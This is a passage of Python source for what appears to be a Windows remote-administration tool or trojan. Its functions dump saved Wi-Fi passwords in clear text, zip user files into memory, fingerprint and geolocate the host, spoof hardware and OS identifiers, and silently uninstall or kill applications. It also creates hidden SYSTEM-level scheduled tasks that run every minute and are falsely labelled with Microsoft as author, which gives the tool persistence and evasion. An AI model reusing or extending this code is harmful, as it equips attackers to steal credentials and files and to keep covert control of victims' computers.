            if not kernel32.FindNextVolumeW(h, buf, sz):
                break
    finally:
        kernel32.FindVolumeClose(h)




def mount(c, path=None, volume=None):
    _sl = lambda p: p if p.endswith('\\') else f'{p}\\'


    match c:
        case 'get':
            ...

        case 'mount':
            path, volume = _sl(path), _sl(volume)

            mkdir(path)
            return (
                    f'volume is mounted ({volume}) --> ({path}) [+]'
                if kernel32.SetVolumeMountPointW(path, volume) != 0 else
                    f'failed to mount volume ({volume}) [-]'
            )
        
        case 'umount':
            path = _sl(path)

            if not _exist(path):
                return f'path does not exist ({path}) [*]'
            
            return (
                    f'path is unmounted ({path}) [+]'
                if kernel32.DeleteVolumeMountPointW(path) != 0 else
                    f'failed to unmount path ({path}) [-]'
            )




def hide(p):
    try:
        cur = win32api.GetFileAttributes(p)

        if cur & ATTR_HIDDEN:
            return True
        
        win32api.SetFileAttributes(p, cur | ATTR_HIDDEN)
        return bool(win32api.GetFileAttributes(p) & ATTR_HIDDEN)
    except Exception:
        return False




def unhide(p):
    try:
        cur = win32api.GetFileAttributes(p)

        if not (cur & ATTR_HIDDEN):
            return True
        
        win32api.SetFileAttributes(p, cur & ~ATTR_HIDDEN)
        return not bool(win32api.GetFileAttributes(p) & ATTR_HIDDEN)
    except Exception:
        return False




def iter_dir(
    p,
    *,
    _q=deque,
    _s=_scandir,
    _i=type(
            '', (),
            {
                '__slots__' : ('path',),
                '__init__'  : lambda t, w : t.__setattr__('path', w)
            }
    ),
    _x = OSError
):
    c = _q(( _i(p), ))

    u = c.appendleft
    g = c.pop

    while c:
        try:

            f = _s(g().path)

            try:
                for e in f:
                    if e.is_dir(follow_symlinks=False):
                        u(e)
                    else:
                        yield e
            finally:
                f.close()

        except _x:
            continue




def make_zip(dp='.', *, _mfs=25 << 20, _mzs=FILE_SZ_LIMIT):
    with BytesIO() as buf:
        with ZipFile(buf, 'w', ZIP_DEFLATED, compresslevel=9) as zf:
            _wt = zf.write

            for e in iter_dir(dp):
                try:
                    sz = e.stat().st_size

                    if sz > _mfs:
                        continue

                
                    p = e.path
                    _wt(p, p)


                    if buf.tell() >= _mzs:
                        break

                except OSError:
                    continue



        return mem(buf.getvalue())




def ipconfig(*, _ch=[None]):
    if not _ch[0]:
        req = http(IPCONFIG_URL, json=True)
        rgt = req.get

        _ch[0] = {
            'ip'       : rgt(IPCONFIG_KEY[0], NULL),
            'isp'      : rgt(IPCONFIG_KEY[1], NULL),
            'country'  : rgt(IPCONFIG_KEY[2], NULL),
            'region'   : rgt(IPCONFIG_KEY[3], NULL),
            'city'     : rgt(IPCONFIG_KEY[4], NULL),
            'postal'   : rgt(IPCONFIG_KEY[5], NULL),
            'timezone' : rgt(IPCONFIG_KEY[6], NULL),
            'location' : rgt(IPCONFIG_KEY[7], NULL)  
        }

    gbi = _ch[0]


    try:

        lci = []

        for (name, addr) in psutil.net_if_addrs().items():
            intr = {
                'name' : name, 
                'mac'  : NULL,
                'ipv4' : NULL, 
                'ipv6' : NULL
            }


            for i in addr:
                fm = i.family

                if fm == AF_INET:
                    intr['ipv4'] = i.address or NULL 

                elif fm == AF_INET6:
                    intr['ipv6'] = i.address or NULL 

                elif fm == psutil.AF_LINK:
                    intr['mac'] = (i.address or NULL).upper().replace('-', ':')
            

            lci.append(intr)

    except Exception:
        lci = None



    with StringIO() as buf:
        buf.write('(IPCONFIG):\n')


        if gbi:
            buf.write(f'''\t((GLOBAL)):
\t\tIP       : {gbi["ip"]}
\t\tISP      : {gbi["isp"]}
\t\tCOUNTRY  : {gbi["country"]}
\t\tREGION   : {gbi["region"]}
\t\tCITY     : {gbi["city"]}
\t\tPOSTAL   : {gbi["postal"]}
\t\tTIMEZONE : {gbi["timezone"]}
\t\tLOCATION : {gbi["location"]}''')
            

        if lci:
            buf.write('\n\n\t((LOCAL)):\n')

            for i in lci:
                buf.write(
f'''\t\tIFACE : {i["name"]}
\t\tMAC   : {i["mac"]}
\t\tIPV4  : {i["ipv4"]}
\t\tIPV6  : {i["ipv6"]}
\n''')


        return buf.getvalue()




def route():
    r = ([], [])


    if out := shell('route PRINT -4', output=True):
        au = r[0].append

        with StringIO(out) as buf:
            for l in buf:
                i = l.split()

                if (len(i) < 5) or (i[1].count('.') != 3):
                    continue
                
                au((
                    i[0],    i[1],
                         i[3],
                    i[2],    i[4]
                ))
    
    if out := shell('route PRINT -6', output=True):
        au = r[1].append
        lb = '::'
        ol = 'On-link'

        with StringIO(out) as buf:
            for l in buf:
                i = l.split()

                if len(i) < 3:
                    continue
                
                if lb in i[2]:
                    au((
                        i[2],
                        i[-1] if i[2] != i[-1] else ol,
                        ' '.join(i[: 2])
                    ))
    


    with StringIO() as buf:
        if r[0]:
            buf.write(tabulate(
                r[0], 
                headers=(
                    'IPV4-ADDRESS', 
                    'MASK', 'INTERFACE', 'GATEWAY', 
                    'METRIC'
                ), 
                tablefmt='grid'
            ))

        if r[1]:
            if buf.tell():
                buf.write('\n\n\n')

            buf.write(tabulate(
                r[1], 
                headers=('IPV6-ADDRESS', 'GATEWAY', 'METRIC'), 
                tablefmt='grid'
            ))


        return buf.getvalue()




def arp():
    r = []


    out = shell('arp -a', output=True)

    if not out:
        return ''


    with StringIO(out) as buf:
        for l in buf:
            i = l.split()

            if (len(i) < 3) or (i[0].count('.') != 3):
                continue

            r.append((
                i[0],
                i[1].upper().replace('-', ':'),
                i[2].upper()
            ))
    


    if r:
        return tabulate(
            r, 
            headers=('IP', 'MAC', 'TYPE'), 
            tablefmt='grid'
        )
    
    return ''




def netstat():
    r = []


    out = shell('netstat -ano', output=True)

    if not out:
        return ''


    with StringIO(out) as buf:
        au = r.append

        for l in buf:
            i = l.split()

            if (len(i) < 4) or not i[-1].isdigit():
                continue

            au((
                i[-1],  
                i[0],  
                i[1], i[2],  
                i[3] if not i[3].isdigit() else NULL
            ))



    if r:
        return tabulate(
            r, 
            headers=(
                'PID', 
                'PROTOCOL', 
                'LOCAL', 'FOREIGN', 
                'STATUS'
            ), 
            tablefmt='grid'
        )

    return ''




def ghz_to_channel(ghz):
    if (ghz == NULL) or (ghz < 0):
        return NULL


    mhz = ghz * 1000  

    if 2400 <= mhz <= 2484: 
        return int((mhz - 2407) // 5)
    
    elif 5000 <= mhz <= 6000:
        return int((mhz - 5000) // 5)
    
    elif 5950 <= mhz <= 7125:
        return int((mhz - 5950) // 5)
    

    return NULL




def wifi():
    r = []


    dev = PyWiFi().interfaces()

    if not dev:
        return ''
    

    iface = None

    for i in dev:
        try:
            i.scan()
            sleep(3)
            iface = i.scan_results()
        except Exception:
            continue

        if iface:
            break
    else:
        return ''

   
    iface.sort(key=lambda s: s.signal, reverse=True)


    _hd = '<hidden>'

    for n in iface:
        ghz = getattr(n, 'freq', NULL)

        if ghz != NULL:
            ghz = round(ghz / 1_000_000, 3)

        r.append((
            getattr(n, 'ssid',  NULL) or _hd,
            getattr(n, 'bssid', NULL).rstrip(':').upper(),

            ghz,
            ghz_to_channel(ghz),

            AKM.get(getattr(n, 'akm', '-1')[0], NULL),
            CIPHER.get(getattr(n, 'cipher', -1), NULL),

            n.signal
        ))



    return tabulate(
        r, 
        headers=(
            'SSID',    'BSSID', 
            'GHZ',     'CHANNEL', 
            'AUTH',    'CIPHER', 
                'SIGNAL'
        ), 
        tablefmt='grid'
    )




def wifi_password():
    r = []


    out = shell('netsh wlan show profiles', output=True)

    if not out:
        return ''
    

    sep  = ':'
    prof = []

    with StringIO(out) as buf:
        for l in buf:
            idx = l.find(sep)

            if idx == -1:
                continue

            if p := l[idx + 1 :].strip():
                prof.append(p)


    if not prof:
        return ''
    

    lb = '-------'
    
    for p in prof:
        shw = shell(f'netsh wlan show profile name={quote(p)} key=clear', output=True)

        if not shw:
            continue


        cap = None
        flg = 0

        with StringIO(shw) as buf:
            for l in buf:
                if l.startswith(lb):
                    if flg >= 3: 
                        break

                    flg += 1

                if flg == 3:
                    idx = l.find(sep)

                    if idx == -1:
                        continue

                    cap = l[idx + 1 :].strip()

                
        if cap:
            r.append((p, cap))



    if r:
        return tabulate(
            r, 
            headers=('SSID', 'PASSWORD'), 
            tablefmt='grid'
        )
    
    return ''




def reg_parse_key(key):
    idx = key.find('\\')

    if idx != -1:
        rk = key[: idx].upper()
        k  = key[idx + 1 :]
    else:
        rk = key.upper()
        k  = ''


    rrk = REG_ROOT_KEY.get(rk)

    if rrk is None:
        raise ValueError


    return (rrk, k)




def reg_unload(h, k):
    return advapi32.RegUnLoadKeyW(capi.c_void_p(h), k) == 0




def reg_del(h, k):
    return advapi32.RegDeleteTreeW(capi.c_void_p(h), k) == 0




def reg_create_key(key, name):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key) as r:
        winreg.CreateKey(r, name)




def reg_delete(key, name, dir):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key, access=winreg.KEY_ALL_ACCESS) as r:
        (
                winreg.DeleteKey 
            if dir else 
                winreg.DeleteValue
        )(r, name)




def reg_get_value(key, name):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key, access=winreg.KEY_READ) as r:
        val, typ = winreg.QueryValueEx(r, name)
        return (val, REG_TYPE.get(typ, NULL))




def reg_set_value(key, name, value, reg_type):
    root, key = reg_parse_key(key)

    match reg_type:
        case 'none':
            reg_value_type = winreg.REG_NONE
            value          = None

        case 'sz':
            reg_value_type = winreg.REG_SZ

        case 'expand_sz':
            reg_value_type = winreg.REG_EXPAND_SZ

        case 'binary':
            reg_value_type = winreg.REG_BINARY
            value          = value.encode() if isinstance(value, str) else value

        case 'dword':
            reg_value_type = winreg.REG_DWORD
            value          = int(value)

        case 'dword_big_endian':
            reg_value_type = winreg.REG_DWORD_BIG_ENDIAN
            value          = int(value)

        case 'qword':
            reg_value_type = winreg.REG_QWORD
            value          = int(value)

    
    with winreg.OpenKey(root, key, access=winreg.KEY_SET_VALUE) as r:
        winreg.SetValueEx(r, name, 0, reg_value_type, value)




def reg_enum(key, dir):
    root, key = reg_parse_key(key)


    enm = winreg.EnumKey if dir else winreg.EnumValue
    res = []
    idx = 0

    with winreg.OpenKey(root, key) as r:
        au = res.append

        while True:
            try:
                n = enm(r, idx)

                au(n if dir else (
                    n[0], n[1],
                    REG_TYPE.get(n[2], NULL)
                ))

                idx += 1
            except OSError:
                break
    

    return res




def device(
    c, 
    id=None, 
    driver=None, 
    changes=None,
    *,
    _ch=[None]
):
    if not _ch[0]:
        try:
            _ch[0] = frozenset(reg_enum(REG_KEY_DEVICE, dir=True))
        except OSError:
            _ch[0] = (None,)


    _ekd = _ch[0]



    def verify_id():
        i = id.find('\\')

        if (
            (i != -1) and 
            (id[: i] in _ekd) and 
            shell(f'pnputil /enum-devices /instanceid {quote(id)}')
        ):
            return 'instanceid'
        

        if (
            parse_cmd(r'(?P<GUID>[{][0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}[}])', id) and 
            shell(f'pnputil /enum-devices /class {quote(id)}')
        ):
            return 'class'
        

        return False



    match c:
        case 'devices':
            out = shell('pnputil /enum-devices /format csv', output=True)

            if not out:
                return ''
            

            with StringIO(out) as buf, StringIO() as r:
                au = r.write

                for d in csv(buf):
                    g = d.get

                    au(
f'''ID     : {g("InstanceId",        NULL)}
GUID   : {g("ClassGuid",             NULL)}
NAME   : {g("DeviceDescription",     NULL)}
TYPE   : {g("ClassName",             NULL)}
VENDOR : {g("ManufacturerName",      NULL)}
DRIVER : {g("DriverName",            NULL)}
STATUS : {g("Status",                NULL).upper()}
\n''')


                return r.getvalue()
        
        case 'query':
            typ = verify_id()

            if not typ:
                return None
            
            
            out = shell(f'pnputil /enum-devices /{typ} {quote(id)} /format csv', output=True)

            if not out:
                return ''


            with StringIO(out) as buf, StringIO() as r:
                for d in csv(buf):
                    g = d.get

                    r.write(
f'''ID     : {g("InstanceId",        NULL)}
GUID   : {g("ClassGuid",             NULL)}
NAME   : {g("DeviceDescription",     NULL)}
TYPE   : {g("ClassName",             NULL)}
VENDOR : {g("ManufacturerName",      NULL)}
DRIVER : {g("DriverName",            NULL)}
STATUS : {g("Status",                NULL).upper()}
\n''')


                return r.getvalue()
        
        case 'install_driver':
            return shell(f'pnputil /add-driver {quote(driver)} /install')
        
        case 'delete_driver':
            return shell(f'pnputil /delete-driver {quote(driver)} /uninstall')
        
        case 'delete':
            typ = verify_id()

            if not typ:
                return None
            
            return shell(f'pnputil /remove-device /{typ} {quote(id)}')
        
        case 'enable':
            typ = verify_id()

            if not typ:
                return None
            
            return shell(f'pnputil /enable-device /{typ} {quote(id)}') 
        
        case 'restart':
            typ = verify_id()

            if not typ:
                return None
            
            return shell(f'pnputil /restart-device /{typ} {quote(id)}')
        
        case 'disable':
            typ = verify_id()

            if not typ:
                return None
            
            return shell(f'pnputil /disable-device /{typ} {quote(id)}')
        
        case 'value':
            try:
                k, v = DEVICE_CHANGES.get(changes)

                match changes:
                    case 'cpu' | 'cpu_id' | 'cpu_mhz' | 'cpu_vendor':
                        return reg_get_value(f'{k}\\0', v)[0] 
                    
                    case 'os_edition' | 'os_version' | 'os_build':
                        return reg_get_value(k, v[0])[0]

                    case 'os_date':
                        return ctime(reg_get_value(k, v)[0])
                    
                    case 'device_name' | 'device_desc':
                        return (
                                reg_get_value(f'{REG_KEY_DEVICE}\\{id}', v)[0] 
                            if verify_id() == 'instanceid' else 
                                NULL
                        )
                    
                    case _:
                        return reg_get_value(k, v)[0]
            except Exception:
                return NULL
                
        case 'change':
            try:
                cdv, cval = changes
                k, v      = DEVICE_CHANGES.get(cdv)

                match cdv:
                    case 'cpu' | 'cpu_id' | 'cpu_mhz' | 'cpu_vendor':
                        for n in reg_enum(k, dir=True):
                            if not n.isdigit():
                                continue

                            reg_set_value(
                                f'{k}\\{n}', v, 
                                cval, 
                                'dword' if v == '~MHz' else 'sz'
                            )                 
                        

                        return True
                    
                    case 'os_edition' | 'os_version' | 'os_build':
                        for n in v:
                            reg_set_value(k, n, cval, 'sz')

                        return True
                    
                    case 'os_date':
                        ts = datetime.strptime(cval, '%H:%M:%S %d.%m.%Y')
                        ts = int(mktime(ts.timetuple()) - timezone)

                        reg_set_value(k, v, ts, 'dword')
                        return True
                    
                    case 'node':
                        reg_set_value(k, v, cval, 'sz')
                        powershell(f'Rename-Computer -Force -NewName {quote(cval)}')
                        return True
                    
                    case 'device_name' | 'device_desc':
                        if verify_id() != 'instanceid':
                            return False
                        
                        reg_set_value(f'{REG_KEY_DEVICE}\\{id}', v, cval, 'sz')
                        return True
            
                    case _:
                        reg_set_value(k, v, cval, 'sz')
                        return True
            except Exception:
                return False
            
        case 'update':
            return shell('pnputil /scan-devices')




def uptime():
    try:
        ms = kernel32.GetTickCount64()
    except AttributeError:
        ms = kernel32.GetTickCount()


    s    = ms // 1000
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m    = s // 60


    with StringIO() as r:
        if d: r.write(f'{int(d)}d,')
        if h: r.write(f'{int(h)}h,')
        if m: r.write(f'{int(m)}m')

        return r.getvalue() or '0m'
    



def get_firmware(*, _ch=[None]):
    if _ch[0]:
        return _ch[0]


    fw = capi.c_ulong(-1)

    try:
        kernel32.GetFirmwareType(capi.byref(fw))
    except AttributeError:
        pass
    

    fw = fw.value

    if   fw == 1 : _ch[0] = 'BIOS'
    elif fw == 2 : _ch[0] = 'UEFI'
    else         : _ch[0] = NULL

    return _ch[0]




def systeminfo():
    def _reg(k, v):
        try:
            reg_get_value(k, v)[0]
        except (IndexError, OSError):
            return NULL


    with StringIO() as buf:
        buf.write(f'''(SYSTEM):
\tUPTIME   : {uptime()}
\tMACHINE  : {MACHINE}
\tFIRMWARE : {get_firmware()}
\tOS       : {OS[0]} {OS[1]} {OS[2]} {OS[3]}
\tNODE     : {NODE}
\tUSER     : {USER}
\tLANG     : {LANG}
\tLAYOUT   : {get_layout()}
\tENCODING : {ENCODING}
''')
        


        buf.write('\n(USER):\n')
 
        if guser := psutil.users():
            _lan = win32security.LookupAccountName
            _slb = 'PySID:'

            for u in guser:
                try:
                    sid = str(_lan(None, u.name)[0])

                    if sid.startswith(_slb):
                        sid = sid[6 :]
                except Exception:
                    sid = NULL


                buf.write(
f'''\tSID      : {sid}
\tNAME     : {NULL if u.name     is None else u.name}
\tHOST     : {NULL if u.host     is None else u.host}
\tTERMINAL : {NULL if u.terminal is None else u.terminal}
\tSTARTED  : {NULL if u.started  is None else ctime(u.started)}
\n''')
        


        buf.write(f'{"" if guser else "\n"}{ipconfig()}')
        


        bios_vendor  = _reg(REG_KEY_BIOS, 'BIOSVendor'     )
        bios_version = _reg(REG_KEY_BIOS, 'BIOSVersion'    )
        bios_date    = _reg(REG_KEY_BIOS, 'BIOSReleaseDate')

        
        buf.write(f'''(BIOS):
\tVENDOR  : {bios_vendor}
\tVERSION : {bios_version}
\tDATE    : {bios_date}
''')
        


        baseboard_product = _reg(REG_KEY_BIOS, 'BaseBoardProduct'     )
        baseboard_vendor  = _reg(REG_KEY_BIOS, 'BaseBoardManufacturer')
        baseboard_version = _reg(REG_KEY_BIOS, 'BaseBoardVersion'     )
        
        
        buf.write(f'''\n(BASEBOARD):
\tPRODUCT : {baseboard_product}
\tVENDOR  : {baseboard_vendor}
\tVERSION : {baseboard_version}
''')
        


        buf.write('\n(BATTERY):\n')
  
        if bat := psutil.sensors_battery():
            tl   = NULL
            secs = bat.secsleft

            if (secs is not None) and (secs >= 0):
                tl = f'{secs // 60}m'


            buf.write(
f'''\tPERCENT    : {NULL if bat.percent is None else int(bat.percent)}%
\tPLUGGED IN : {"TRUE" if bat.power_plugged else "FALSE"}
\tTIME LEFT  : {tl}
''')
            


        cfreq = psutil.cpu_freq()
        cperc = psutil.cpu_percent()

        mhz = (
                (f'cur({int(cfreq.current)})/' 
                 f'min({int(cfreq.min)})/'
                 f'max({int(cfreq.max)}) MHz')
            if cfreq else 
                NULL
        )
        
        buf.write(f'''\n(CPU):
\tNAME      : {PROCESSOR}
\tCORE      : {psutil.cpu_count(False) or NULL}
\tFREQUENCY : {mhz}
\tUSAGE     : {NULL if cperc is None else int(cperc)}%
''')
        
        

        buf.write('\n(GPU):\n')
        ok = False
   
        if out := powershell((
            'Get-CimInstance Win32_VideoController | Select-Object '
            'Caption, VideoModeDescription, AdapterCompatibility, VideoProcessor, '
            'CurrentHorizontalResolution, CurrentVerticalResolution, CurrentRefreshRate | '
            'ConvertTo-Csv -NoTypeInformation'
        ), output=True):
            with StringIO(out) as bgp:
                for v in csv(bgp):
                    g = v.get 

                    buf.write(
f'''\tNAME        : {g("Caption",                 NULL)}
\tDESCRIPTION : {g("VideoModeDescription",        NULL)}
\tVENDOR      : {g("AdapterCompatibility",        NULL)}
\tPROCESSOR   : {g("VideoProcessor",              NULL)}
\tRESOLUTION  : {g("CurrentHorizontalResolution", NULL)}x{g("CurrentVerticalResolution", NULL)}
\tREFRESH     : {g("CurrentRefreshRate",          NULL)} Hz
\n''')
                    ok = True
                    


        buf.write(f'{"" if ok else "\n"}(RAM):\n')

        if pmem := psutil.virtual_memory():
            buf.write(
f'''\tTOTAL : {NULL if pmem.total   is None else pmem.total >> 30} GiB
\tUSED  : {    NULL if pmem.used    is None else pmem.used  >> 30} GiB
\tFREE  : {    NULL if pmem.free    is None else pmem.free  >> 30} GiB
\tUSAGE : {    NULL if pmem.percent is None else int(pmem.percent)}%
''')
        

        
        buf.write('\n(SWAP):\n')

        if pswap := psutil.swap_memory():
            buf.write(
f'''\tTOTAL : {NULL if pswap.total   is None else pswap.total >> 30} GiB
\tUSED  : {    NULL if pswap.used    is None else pswap.used  >> 30} GiB
\tFREE  : {    NULL if pswap.free    is None else pswap.free  >> 30} GiB
\tUSAGE : {    NULL if pswap.percent is None else int(pswap.percent)}%
''')
        


        buf.write('\n(DISK):\n')

        if pdisk := psutil.disk_partitions():
            fdu = psutil.disk_usage

            for d in pdisk:
                try:
                    duse = fdu(d.mountpoint)
                except Exception:
                    continue
                

                tl = duse.total >> 30 if duse.total else -1

                if tl <= 0:
                    continue


                buf.write(
f'''\tNAME         : {d.device if d.device else NULL}
\tMOUNT OPTION : {    d.opts   if d.opts   else NULL}
\tFILE SYSTEM  : {    d.fstype if d.fstype else NULL}
\tTOTAL        : {tl                                                } GiB
\tUSED         : {NULL if duse.used    is None else duse.used  >> 30} GiB
\tFREE         : {NULL if duse.free    is None else duse.free  >> 30} GiB
\tUSAGE        : {NULL if duse.percent is None else int(duse.percent)}%
\n''')
                

        
        return buf.getvalue()




def exist_service(name):
    try:
        win32serviceutil.QueryServiceStatus(name)
        return True
    except Exception:
        return False




def service():
    with StringIO() as r:
        au = r.write

        for s in psutil.win_service_iter():
            try:
                au(
f'''PID          : {s.pid()      or NULL}
NAME         : {s.name()         or NULL}
DISPLAY NAME : {s.display_name() or NULL}
DESCRIPTION  : {s.description()  or NULL}
USER         : {s.username()     or NULL}
COMMAND      : {s.binpath()      or NULL}
START TYPE   : {(s.start_type()  or NULL).upper()}
STATUS       : {(s.status()      or NULL).upper()}
\n''')
            except Exception:
                continue
        

        return r.getvalue()




def exist_task(name):
    try:
        with scheduler() as sch:
            sch.GetTask(name)

        return True
    except Exception:
        return False




def create_task(
    tuser, 
    name, description, 
    path, targs, 
    hidden, 
    event, 
    *,
    bot_task=False,
    _sv='Schedule.Service',
    _au=(
            'Корпорация Майкрософт.' 
        if LANG in ('ru_RU', 'uk_UA') else 
            'Microsoft Corporation.'
    ),
    _fm='%Y-%m-%dT%H:%M:%S'
):
    try:
        CoInitialize()
        sch = Dispatch(_sv)
        sch.Connect()


        task_def  = sch.NewTask(0)
        settings  = task_def.Settings
        principal = task_def.Principal


        task_def.RegistrationInfo.Description = description
        task_def.RegistrationInfo.Author      = _au


        match tuser:
            case 'system':
                principal.UserId = 'SYSTEM'
                user_logon       = 5
            case 'user':
                user_logon       = 3
            case 'users':
                user_logon       = 0


        event_type = event[0]


        match event_type:
            case 'startup':  
                trigger = task_def.Triggers.Create(8)  

            case 'logon':  
                trigger = task_def.Triggers.Create(9)  

                if user_logon == 3:
                    trigger.UserId = USER

            case 'logoff':
                trigger             = task_def.Triggers.Create(11)  
                trigger.StateChange = 2

                if user_logon == 3:
                    trigger.UserId = USER

            case 'idle':  
                minute, hour = event[-1].split(maxsplit=1)

                trigger = task_def.Triggers.Create(6)  

                idle               = settings.IdleSettings
                idle.IdleDuration  = timedelta(minutes=int(minute))  
                idle.WaitTimeout   = timedelta(hours=int(hour))           
                idle.RestartOnIdle = False  

            case 'time':  
                if bot_task:
                    trigger                     = task_def.Triggers.Create(1)  
                    trigger.StartBoundary       = datetime.now().strftime(_fm)
                    trigger.Repetition.Interval = 'PT1M'
                else:
                    tim = event[1]

                    datetime.strptime(tim, _fm)

                    trigger               = task_def.Triggers.Create(1)  
                    trigger.StartBoundary = tim

            case 'event':  
                ev = event[-1]

                if (
                    not ev.startswith('<QueryList>') or 
                    not ev.endswith(  '</QueryList>')
                ):
                    raise ValueError

                trigger              = task_def.Triggers.Create(0)  
                trigger.Subscription = ev

            case _:
                raise ValueError
            
            
        if event_type != 'time':
            trigger.StartBoundary = datetime.now().strftime(_fm)
        

        action      = task_def.Actions.Create(0)  
        action.Path = _absp(path)

        if targs != 'none':
            action.Arguments = targs
            

        principal.RunLevel                  = 1
        settings.Priority                   = 7
        settings.Enabled                    = True
        settings.Hidden                     = hidden
        settings.AllowDemandStart           = True
        settings.StartWhenAvailable         = True
        settings.AllowHardTerminate         = False
        settings.ExecutionTimeLimit         = 'PT0S'
        settings.RunOnlyIfIdle              = False
        settings.StopIfGoingOnBatteries     = False 
        settings.DisallowStartIfOnBatteries = False
        settings.IdleSettings.StopOnIdleEnd = False


        sch.GetFolder('\\').RegisterTaskDefinition(
            name,                
            task_def,                 
            6,                        
            None, None,                    
            user_logon                  
        )
    except (ValueError, IndexError):
        return False
    except Exception:
        return None
    else:
        return True
    finally:
        CoUninitialize()




def task():
    out = shell('schtasks /query /fo csv /nh', output=True)

    if not out:
        return ''
    

    with StringIO(out) as buf, StringIO() as r:
        au = r.write

        for i in csv(buf):
            t = tuple(i.values())

            if len(t) < 3:
                continue

            au(
f'''NAME   : {t[0]}
EVENT  : {t[1]}
STATUS : {t[2]}
\n''')


        return r.getvalue()



 
def startup_enum(key, kst):
    r = []

    try:
        st = {k.lower(): v for (k, v, _) in reg_enum(kst, dir=False)}


        if _isdir(key):
            skp = 'desktop.ini'

            with _scandir(key) as sc:
                for e in sc:
                    name = e.name

                    if name == skp:
                        continue
                    
                    r.append((
                        name, f'{key}\\{name}', 
                        st.get(name.lower(), b'') == REG_VALUE_STARTUP_ENABLED
                    ))
        else:
            for (name, val, _) in reg_enum(key, dir=False):
                r.append((
                    name, val, 
                    st.get(name.lower(), b'') == REG_VALUE_STARTUP_ENABLED
                ))                   
    except Exception: 
        pass
        

    return r




def startup():
    _fm = lambda i: (
f'''\tNAME    : {i[0]}
\tCOMMAND : {i[1]}
\tSTATUS  : {"ENABLED" if i[2] else "DISABLED"}
\n''')


    with StringIO() as buf:
        sp_machine = (
            startup_enum(REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_MACHINE_STATUS),
            startup_enum(PATH_STARTUP_MACHINE,    PATH_STARTUP_MACHINE_STATUS   )
        )
        
        sp_user = (
            startup_enum(REG_KEY_STARTUP_USER,    REG_KEY_STARTUP_USER_STATUS   ),
            startup_enum(PATH_STARTUP_USER,       PATH_STARTUP_USER_STATUS      )
        )


        if sp_machine[0] or sp_machine[1]:
            buf.write('(STARTUP MACHINE):\n')

            for l in sp_machine:
                for a in l:
                    buf.write(_fm(a))
            

        if sp_user[0] or sp_user[1]:
            buf.write('(STARTUP USER):\n')

            for l in sp_user:
                for a in l:
                    buf.write(_fm(a))
            

        return buf.getvalue()




def startup_query(name, machine, reg=False):
    pky = (
        (REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_MACHINE_STATUS), 
        (PATH_STARTUP_MACHINE,    PATH_STARTUP_MACHINE_STATUS   )  
    ) if machine else (
        (REG_KEY_STARTUP_USER,    REG_KEY_STARTUP_USER_STATUS   ), 
        (PATH_STARTUP_USER,       PATH_STARTUP_USER_STATUS      ) 
    )


    lwn = name.lower()
  
    for (key, kst) in pky:
        for (nm, p, st) in startup_enum(key, kst):
            if nm.lower() != lwn:
                continue

            return (
                f'{key}\\{nm}' if reg else nm,
                p,
                f'{kst}\\{nm}' if reg else st 
            )
    

    return None




def app(
    *, 
    _klg=KEYBOARD_LAYOUT.get,
    _rgv=reg_get_value,
    _dts=datetime.strptime
):
    with StringIO() as r:
        au = r.write

        for k in (REG_KEY_APP, REG_KEY_APP_6432):
            for i in reg_enum(k, dir=True):
                kap = f'{k}\\{i}'


                try:
                    name = _rgv(kap, 'DisplayName')[0]
                except OSError:
                    continue

                try:
                    vendor = _rgv(kap, 'Publisher')[0]
                except OSError:
                    vendor = NULL

                try:
                    version = _rgv(kap, 'DisplayVersion')[0]
                except OSError:
                    version = NULL

                try:
                    alang = _klg(
                        f'{_rgv(kap, "Language")[0]:08X}', 
                        NULL
                    )
                except (ValueError, OSError): 
                    alang = NULL

                try:
                    date = _dts(
                        _rgv(kap, 'InstallDate')[0], 
                        '%Y%m%d'
                    ).strftime('%d.%m.%Y')
                except (ValueError, OSError):
                    date = NULL


                au(
f'''NAME    : {name}
VENDOR  : {vendor}
VERSION : {version}
LANG    : {alang}
DATE    : {date}
\n''')



        return r.getvalue()




def app_blocker():
    sep = '='

    while True:
        sleep(3)

        if not _isfile(FILE_APP_BLOCKER):
            continue
        

        try:

            out = read_file(FILE_APP_BLOCKER)

            if not out:
                continue

            
            with StringIO(decrypt(out)) as buf:
                for l in buf:
                    n = l.split(sep)

                    if len(n) == 2:
                        kill(n[0])

        except Exception:
            continue




def delete_app(name, *, _rgv=reg_get_value):
    for k in (REG_KEY_APP, REG_KEY_APP_6432):
        for i in reg_enum(k, dir=True):
            kap = f'{k}\\{i}'


            try:
                apnm = _rgv(kap, 'DisplayName')[0]
            except OSError:
                continue

            if apnm != name:
                continue


            try:
                uns = _rgv(kap, 'UninstallString')[0]
                unl = uns.lower()


                if unl.startswith('msiexec'):
                    aph = parse_cmd(r'(?i).*?msiexec\S*\s+(?P<arg>.*)', uns)
                    cmd = (
                            f'msiexec {aph["arg"]} /quiet /qn /norestart'
                        if aph else 
                            uns
                    )
            
                elif unl.endswith('.exe'):
                    cmd = f'{quote(uns)} /VERYSILENT /SUPPRESSMSGBOXES /NORESTART'
                
                else:
                    cmd = uns 


                return shell(cmd)
            except OSError:
                return False
                

    return False




def get_admin_group(*, _ws=win32security):
    try:
        sid = _ws.CreateWellKnownSid(_ws.WinBuiltinAdministratorsSid, None)
        return _ws.LookupAccountSid(None, sid)[0]
    except Exception: 
        return 'Administrators'




def user(
    c, 
    name='', 
    password='',
    description='', 
    group='',
    *,
    _pas=1003,    _com=1004,    _flg=1008,
            _exs=1378,    _noex=1387,
            _unf=2221,    _uex=2224,
    _wnt=win32net,
    _wcn=win32netcon
):
    match c:
        case 'get' | 'query' as _q:
            try:
                usrs = (
                        _wnt.NetUserEnum(None, 0, 0)[0]
                    if _q == 'get' else 
                        (_wnt.NetUserGetInfo(None, name, 4),)
                )
            except Exception:
                return ''
            

            with StringIO() as r:
                _slb = 'PySID:'

                for u in usrs:
                    try:
                        qu = (
                                _wnt.NetUserGetInfo(None, u['name'], 4)
                            if _q == 'get' else 
                                u
                        )
                        gt = qu.get
                    except Exception:
                        continue
                    
                    
                    sid = str(gt('user_sid', NULL))

                    if sid.startswith(_slb): 
                        sid = sid[6 :]
                    
                    lg = (
                            'NEVER LOGIN' 
                        if not gt('last_logon') else 
                            ctime(gt('last_logon'))
                    )

                    st = (
